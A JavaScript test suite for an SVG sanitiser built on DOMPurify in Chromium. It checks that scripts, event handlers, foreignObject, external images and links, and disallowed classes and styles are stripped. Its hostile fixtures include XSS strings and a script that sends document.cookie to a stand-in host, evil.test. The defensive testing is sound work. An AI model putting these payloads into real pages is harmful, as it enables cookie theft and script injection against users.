/**
 * Tests for the authoritative SVG sanitiser (DOMPurify in real Chromium).
 *
 * Requires a Playwright browser — run inside the pinned image, e.g.:
 *   docker run --rm -v "<repo>:/work" -v /work/node_modules -w /work \
 *     mcr.microsoft.com/playwright:v1.60.0-noble \
 *     bash -c "npm ci && node --test scripts/sanitize-animal-svg.test.mjs"
 *
 * Proves the SUSPENDERS: the dangerous path is stripped by the allowlist pass,
 * and benign geometry / gradients / allowed classes survive (completing the
 * AD-28 hostile-fixture story — bad classes are STRIPPED here).
 */
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { sanitizePart, sanitizePartsWithPage, summariseRemovals } from "./sanitize-animal-svg.mjs";

let browser;
let page;

before(async () => {
  const { chromium } = await import("playwright");
  browser = await chromium.launch();
  page = await browser.newPage();
  await page.setContent("<!doctype html><title>sanitiser tests</title>");
});

after(async () => {
  await browser?.close();
});

const clean = (svg) => sanitizePart(page, svg).then((r) => r.clean);

test("[SAN-1] <script> is stripped, geometry kept", async () => {
  const out = await clean('<path d="M1,2 L3,4" fill="hsl(var(--animal-fur))"/><script>alert(1)</script>');
  assert.ok(!/script/i.test(out), out);
  assert.ok(/<path/i.test(out), out);
  assert.ok(/d="M1,2 L3,4"/.test(out), out);
});

test("[SAN-2] inline event handlers are stripped", async () => {
  const out = await clean('<circle cx="1" cy="2" r="3" onload="evil()" onclick="x()"/>');
  assert.ok(!/onload|onclick/i.test(out), out);
  assert.ok(/<circle/i.test(out), out);
});

test("[SAN-3] <foreignObject> (and its HTML) is stripped", async () => {
  const out = await clean('<foreignObject><body><img src=x onerror=alert(1)></body></foreignObject><path d="M0 0"/>');
  assert.ok(!/foreignobject|onerror|<img/i.test(out), out);
});

test("[SAN-4] <image> is stripped", async () => {
  const out = await clean('<image href="https://evil.test/x.gif" width="1" height="1"/><path d="M0 0"/>');
  assert.ok(!/<image/i.test(out), out);
});

test("[SAN-5] external href dropped; internal #fragment kept", async () => {
  const ext = await clean('<use href="https://evil.test/s.svg#x"/>');
  assert.ok(!/evil\.test/i.test(ext), ext);
  const frag = await clean('<rect x="0" y="0" width="1" height="1" fill="url(#g)"/><use href="#g"/>');
  assert.ok(/href="#g"/.test(frag), frag);
});

test("[SAN-6] gradient + url(#id) reference preserved", async () => {
  const out = await clean(
    '<defs><linearGradient id="g"><stop offset="0" stop-color="hsl(var(--animal-fur))"/>' +
      '<stop offset="1" stop-color="hsl(var(--animal-fur-shadow))"/></linearGradient></defs>' +
      '<rect x="0" y="0" width="10" height="10" fill="url(#g)"/>',
  );
  assert.ok(/lineargradient/i.test(out), out);
  assert.ok(/<stop/i.test(out), out);
  assert.ok(/url\(#g\)/.test(out), out);
});

test("[SAN-7] allowed leg class kept; foreign class stripped", async () => {
  const out = await clean('<g class="cat-fl-lower evcc-card-root hacked"><line x1="1" y1="2" x2="3" y2="4"/></g>');
  assert.ok(/cat-fl-lower/.test(out), out);
  assert.ok(!/evcc-card-root|hacked/.test(out), out);
});

test("[SAN-8] animal-eyes class (charging pulse opt-in) kept", async () => {
  const out = await clean('<g class="animal-eyes"><circle cx="1" cy="2" r="3" fill="hsl(var(--animal-eye))"/></g>');
  assert.ok(/animal-eyes/.test(out), out);
  assert.ok(/var\(--animal-eye\)/.test(out), out);
});

test("[SAN-9] full hostile fixture: every dangerous construct gone, removals reported", async () => {
  const hostile = {
    body: '<path d="M1,2"/><script>fetch("https://evil.test/"+document.cookie)</script>',
    head: '<circle cx="1" cy="2" r="3" onload="alert(document.domain)"/>',
    tail: '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject>',
    face: '<image href="https://evil.test/track.gif"/>',
    leg: '<g class="evcc-card-root"><use href="https://evil.test/s.svg#x"/></g>',
  };
  const res = await sanitizePartsWithPage(page, hostile);
  const all = Object.values(res.parts).join("\n");
  assert.ok(!/script|onload|onerror|foreignobject|<image|<img|evil\.test|evcc-card-root/i.test(all), all);
  assert.equal(res.changed, true);
  assert.ok(Object.keys(res.removed).length >= 1, JSON.stringify(res.removed));
  assert.ok(typeof summariseRemovals(res.removed) === "string");
});

test("[SAN-10] a clean benign part is preserved (idempotent-ish)", async () => {
  const benign = '<g class="cat-fl-lower" style="transform-origin: 170px 236px"><line x1="170" y1="236" x2="172" y2="275" stroke="hsl(var(--animal-fur))" stroke-width="11"/></g>';
  const out = await clean(benign);
  assert.ok(/cat-fl-lower/.test(out), out);
  assert.ok(/stroke-width="11"/.test(out), out);
  assert.ok(/transform-origin/.test(out), out);
});

test("[SAN-11] inline style clamped to allowed props (transform-origin kept, rest dropped)", async () => {
  const out = await clean('<g style="transform-origin: 170px 236px; background: red; position: fixed"><path d="M0 0"/></g>');
  assert.ok(/transform-origin/.test(out), out);
  assert.ok(!/background|position:\s*fixed/i.test(out), out);
});
